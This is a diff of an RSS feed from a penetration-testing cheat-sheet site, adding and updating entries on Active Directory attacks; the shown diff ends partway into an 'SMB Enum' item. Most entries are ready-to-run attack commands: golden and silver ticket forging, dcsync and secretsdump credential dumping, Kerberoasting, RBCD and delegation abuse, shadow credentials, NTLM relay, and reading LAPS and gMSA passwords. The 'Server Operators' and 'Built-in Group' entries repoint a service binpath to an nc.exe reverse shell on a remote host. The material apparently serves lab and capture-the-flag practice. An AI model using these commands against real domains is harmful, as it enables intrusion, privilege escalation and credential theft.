@@ -15,6 +15,13 @@
       <description>Privesc from DA to EA 1. Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4. Forge a golden ticket # Append &amp;#39;-519&amp;#39; to target domain SID ./mimikatz.exe &amp;#39;kerberos::golden /user:Administrator /rc4:&amp;lt;HASH&amp;gt; /domain:CURRENT.EXAMPLE.COM /sid:&amp;lt;CURRENT_DOMAIN_SID&amp;gt; /sids:&amp;lt;TARGET_DOMAIN_SID&amp;gt;-519 /ticket:c:\windows\tasks\ticket.kirbi&amp;#39; &amp;#39;exit&amp;#39; Note: May need to try different high value hashes</description>
     </item>
     <item>
+      <title>Account Operators</title>
+      <link>https://tldrbins.github.io/account_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/account_operators/</guid>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Create New User Account Authenticated $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} # Create new user New-AdUser new_user -enabled $true -accountpassword $secstr # Grant new user privilege (e.g. WinRM) Add-DomainGroupMember -Identity WinRM -Members &amp;#39;new_user&amp;#39; Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Create new user New-AdUser new_user -credential $cred -enabled $true -accountpassword $secstr # Grant new user privilege (e.</description>
+    </item>
+    <item>
       <title>AD Recycle Bin</title>
       <link>https://tldrbins.github.io/ad_recycle_bin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -22,32 +29,88 @@
       <description> AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq &amp;#34;TempAdmin&amp;#34; } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName &amp;#34;new_user&amp;#34; -TargetPath &amp;#34;CN=Users,DC=example,DC=com&amp;#34; </description>
     </item>
     <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad # Use certipy-ad certipy-ad find -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc # Use nxc nxc ldap 10.10.11.10 -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M adcs Enum (From Windows) Powershell # Check ADCS service net start | findstr /i cert # Check env certutil # Get list of certificate templates certutil -catemplates Certify.exe # Get info of each template .\certify.exe find # Find vuln template .</description>
+    </item>
+    <item>
+      <title>AddKeyCredentialLink</title>
+      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
+      <description>From Linux pywhisker&#xA;0. Pre-check (optional) python3 pywhisker.py --action list -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools&#xA;sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; python3 gettgtpkinit.py -cert-pfx &amp;lt;.pfx&amp;gt; -pfx-pass &amp;lt;pfx_password&amp;gt; example.</description>
+    </item>
+    <item>
+      <title>AddSelf</title>
+      <link>https://tldrbins.github.io/addself/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addself/</guid>
+      <description>AddSelf (From Linux) powerview.py powerview.py&#xA;# Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; powerview &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; # Add self to group Add-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; -Members &amp;lt;USERNAME&amp;gt; # Check Get-DomainGroupMember -Identity &amp;lt;TARGET_GROUP&amp;gt; # Exit and login to make changes first Add-DomainObjectAcl -TargetIdentity &amp;lt;ANOTHER_GROUP&amp;gt; -PrincipalIdentity &amp;lt;USERNAME&amp;gt; -Rights fullcontrol # Check Get-DomainObjectAcl -Identity &amp;lt;TARGET_USER_IN_ANOTHER_GROUP&amp;gt; -Where &amp;#34;SecurityIdentifier contains &amp;lt;USERNAME&amp;gt;&amp;#34; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;TARGET_GROUP&amp;gt; &amp;lt;USERNAME&amp;gt; # After getting full control of target group (e.</description>
+    </item>
+    <item>
+      <title>AllowedToDelegate</title>
+      <link>https://tldrbins.github.io/allowedtodelegate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
+      <description>Craft a Ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; impacket-getST -dc-ip 10.10.11.10 -spn www/dc.example.com -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator example.com/username # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work</description>
+    </item>
+    <item>
       <title>Bloodhound</title>
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound.py python3 bloodhound.py -d example.com -u username -p password -dc example.com -ns 10.10.11.10 -c all --zip </description>
+      <description>sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all bloodhound-python # With Creds bloodhound-python -d example.com -u username -p password -dc example.com -ns 10.10.11.10 -c all --zip # With Kerberos sudo ntpdate -s dc.example.com &amp;amp;&amp;amp; bloodhound-python -u username -p &amp;#39;password&amp;#39; -k -d example.com -dc dc.example.com -ns 10.10.11.10 -c all --zip bloodhound with PKI support BloodHound&#xA;# Fix: GPU process isn&amp;#39;t usable. Goodbye.</description>
+    </item>
+    <item>
+      <title>Built-in Group</title>
+      <link>https://tldrbins.github.io/built-in_group/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/built-in_group/</guid>
+      <description> Privesc Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\Windows\Tasks\nc.exe -e cmd 10.10.14.10 443&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
+    </item>
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k Check forwardable flag impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check flags describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
+    </item>
+    <item>
+      <title>Cross Session Relay</title>
+      <link>https://tldrbins.github.io/cross_session_relay/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
+      <description> Display information about the session host qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Method #1 : RemotePotato0 RemotePotato0&#xA;# In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x 10.10.14.10 -p 9999 Method #2 : KrbRelay KrbRelay&#xA;C:\Windows\Tasks\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\Windows\Tasks\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&amp;#34; </description>
+    </item>
+    <item>
+      <title>ExecuteDCOM</title>
+      <link>https://tldrbins.github.io/executedcom/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/executedcom/</guid>
+      <description> impacket (From Linux) # Revshell impacket-dcomexec &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@10.10.11.10 &amp;#39;&amp;lt;powershell #3 Base64&amp;gt;&amp;#39; -silentcommand -object MMC20 </description>
     </item>
     <item>
       <title>ForceChangePassword</title>
       <link>https://tldrbins.github.io/forcechangepassword/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/forcechangepassword/</guid>
-      <description> ForceChangePassword rpcclient -U &amp;#39;domain/username%password&amp;#39; 10.10.11.10 -c &amp;#39;setuserinfo2 target_user 23 &amp;#34;Test123!&amp;#34;&amp;#39; </description>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Change Target User Password $pass = ConvertTo-SecureString &amp;#39;password&amp;#39; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;target_user&amp;gt; -AccountPassword $pass Using rpcclient rpcclient -U &amp;#39;domain/username%password&amp;#39; 10.10.11.10 -c &amp;#39;setuserinfo2 target_user 23 &amp;#34;password&amp;#34;&amp;#39; </description>
     </item>
     <item>
       <title>GenericAll</title>
       <link>https://tldrbins.github.io/genericall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericall/</guid>
-      <description> Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#39;Exchange Windows Permissions&amp;#39; -Members USER -Credential $Cred </description>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Change Target User Password From Windows $pass = ConvertTo-SecureString &amp;#39;password&amp;#39; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;target_user&amp;gt; -AccountPassword $pass From Linux bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Abuse #2 : Get shawdow credentials (From Linux) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; certipy-ad shadow auto -username &amp;lt;USERNAME&amp;gt;@&amp;lt;DOMAIN&amp;gt; -password &amp;lt;PASSWORD&amp;gt; -k -account &amp;lt;TARGET_USER&amp;gt; -target &amp;lt;DC&amp;gt; Abuse #3 : Add user to group Authenticated # For example &amp;#39;Exchange Windows Permissions&amp;#39; Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.</description>
     </item>
     <item>
       <title>GenericWrite</title>
       <link>https://tldrbins.github.io/genericwrite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericwrite/</guid>
-      <description> Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 </description>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser &amp;lt;target_user&amp;gt; | ConvertFrom-UACValue # Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;target_user&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 Abuse #2 : Kerberoasting by adding spn Add spn # Add spn setspn -a MSSQLSvc/example.com:1433 example.com\target_user # Check Get-DomainUser target_user | Select serviceprincipalname Runas $password = ConvertTo-SecureString &amp;#39;password&amp;#39; -AsPlainText -Force $cred = New-Object System.</description>
     </item>
     <item>
       <title>GetChanges/GetChangesAll</title>
@@ -61,28 +124,70 @@
       <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/roasting/</guid>
-      <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos&#xA;Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password </description>
+      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 example.com/user Kerberoasting From Linux # Fix time skew sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;example.com/username:password&amp;#39; -dc-ip 10.10.11.10 Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s 10.</description>
     </item>
     <item>
       <title>Kerberos</title>
       <link>https://tldrbins.github.io/kerberos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kerberos/</guid>
-      <description>Kerbrute Download kerbrute&#xA;kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .</description>
+      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain example.com --dc 10.10.11.10 usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1 : Using impacket sudo ntpdate -s 10.10.11.10 &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; example.com/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
+    </item>
+    <item>
+      <title>Krbrelayx</title>
+      <link>https://tldrbins.github.io/krbrelayx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/krbrelayx/</guid>
+      <description> Tools krbrelayx&#xA;Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u domain\\username -p password --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0 </description>
     </item>
     <item>
       <title>LDAP</title>
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ldap/</guid>
-      <description>Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
+      <description>ldapsearch # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
+    </item>
+    <item>
+      <title>Machine Account</title>
+      <link>https://tldrbins.github.io/machine_account/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/machine_account/</guid>
+      <description> Abuse #1 : Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache&#xA;python3 rubeustoccache.py &amp;lt;base64_encoded_ticket&amp;gt; secrets.kirbi secrets.ccache 3. Dump Secrets export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator </description>
     </item>
     <item>
       <title>NetExec (nxc)</title>
       <link>https://tldrbins.github.io/nxc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nxc/</guid>
-      <description> nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ </description>
+      <description>nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
+    </item>
+    <item>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>1. Run socat to redirect traffic (In Windows Target) socat&#xA;# Upload socat.zip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
+    </item>
+    <item>
+      <title>RBCD Attack</title>
+      <link>https://tldrbins.github.io/rbcd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbcd/</guid>
+      <description>RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.10.11.10 example.com/username:password 2. Rbcd attack impacket-rbcd -delegate-to TARGET_COMPUTER$ -delegate-from EvilComputer$ -dc-ip dc.example.com -action &amp;#39;write&amp;#39; example.com/username:password 3. Impersonate sudo ntpdate -s dc.example.com &amp;amp;&amp;amp; impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip dc.example.com &amp;#39;example.com/EvilComputer:password&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_dc.example.com@example.com.ccache 5. Post-Attack # Remote sudo ntpdate -s dc.</description>
+    </item>
+    <item>
+      <title>ReadGMSAPassword</title>
+      <link>https://tldrbins.github.io/readgmsapassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
+      <description> gMSADumper gMSADumper&#xA;python3 gMSADumper.py -u username -p password -l 10.10.11.10 -d example.com bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Save as Cred (From Windows) $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword $cred = New-Object System.Management.Automation.PSCredential &amp;lt;TARGET_NAME&amp;gt;, $SecPass # For example, change password of another target user Invoke-Command -ComputerName &amp;lt;COMPUTER_NAME&amp;gt; -ScriptBlock {Set-ADAccountPassword -Identity &amp;lt;ANOTHER_TARGET_NAME&amp;gt; -reset -NewPassword (ConvertTo-SecureString -AsPlainText &amp;#39;Test1234&amp;#39; -force)} -Credential $cred </description>
+    </item>
+    <item>
+      <title>ReadLAPSPassword</title>
+      <link>https://tldrbins.github.io/readlapspassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readlapspassword/</guid>
+      <description> From Windows Import PowerView.ps1 . .\PowerView.ps1 Runas $password = ConvertTo-SecureString &amp;#34;password&amp;#34; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(&amp;#34;domain\username&amp;#34;, $password) Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred From Linux ldapsearch -h 10.10.11.10 -b &amp;#39;DC=example,DC=com&amp;#39; -x -D username@example.com -w password &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd </description>
     </item>
     <item>
       <title>RPC</title>
@@ -96,7 +201,7 @@
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USERNAME&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
     </item>
     <item>
       <title>Server Operators</title>
@@ -106,11 +211,32 @@
       <description> Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= &amp;#34;C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443&amp;#34; # Stop service sc.exe stop browser # Start service sc.exe stop browser </description>
     </item>
     <item>
+      <title>Silver Ticket</title>
+      <link>https://tldrbins.github.io/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/silver_ticket/</guid>
+      <description>From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:example.com /dc:dc.example.com /creduser:example.com\username /credpassword:password /nowrap 2. Generate NTLM .\rubeus.exe hash /password:password 3. Get domain SID Locally import-module activedirectory Get-ADDomain | fl DomainSID Remotely # Install ldp.exe (Windows 11) Settings &amp;gt; System &amp;gt; Optional Features &amp;gt; More Windows Features and add &amp;#39;Active Driectory Lightweight Directory Services&amp;#39; # Bind &amp;gt; Bind with credentials ldp.exe # Browse &amp;gt; Search BaseDN: DC=example,DC=com Filter: (objectclass=User) 4.</description>
+    </item>
+    <item>
+      <title>SMB Enum</title>
+      <link>https://tldrbins.github.io/smb_enum/</link>
